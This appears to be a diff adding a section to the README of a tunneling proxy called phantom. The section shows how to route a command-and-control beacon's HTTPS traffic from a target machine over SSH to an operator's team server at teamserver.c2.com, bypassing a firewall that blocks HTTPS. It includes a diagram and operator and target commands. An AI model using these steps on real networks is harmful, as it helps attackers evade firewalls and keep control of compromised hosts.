@@ -85,6 +85,34 @@ Remote forward (client listens, routes through server):
 
 Both flags are repeatable.
 
+### Use Case: Tunneling a Beacon Through a Restricted Firewall
+
+If the target network blocks HTTPS but allows SSH, you can route a beacon's HTTPS traffic through the tunnel using a remote port forward:
+
+```
+[TARGET MACHINE]                              [OPERATOR MACHINE]
+
+Beacon ──HTTPS──► 127.0.0.1:8443             phantom-server ──TCP──► teamserver:443
+                      │                            ▲
+                phantom-client ════════════════════╝
+                  (SSH transport, bypasses firewall)
+```
+
+Server (operator):
+
+```
+./phantom-server -listen :2222 -transport ssh -secret mysecret
+```
+
+Client (target):
+
+```
+./phantom-client -server operator:2222 -transport ssh -secret mysecret \
+    -remote-forward 127.0.0.1:8443:teamserver.c2.com:443
+```
+
+Configure the beacon to callback to `https://127.0.0.1:8443`. The proxy tunnels the raw TCP bytes over SSH to the server, which dials the team server. The beacon's TLS handshake happens end-to-end — the proxy never decrypts the traffic.
+
 ## Flags
 
 ### Server
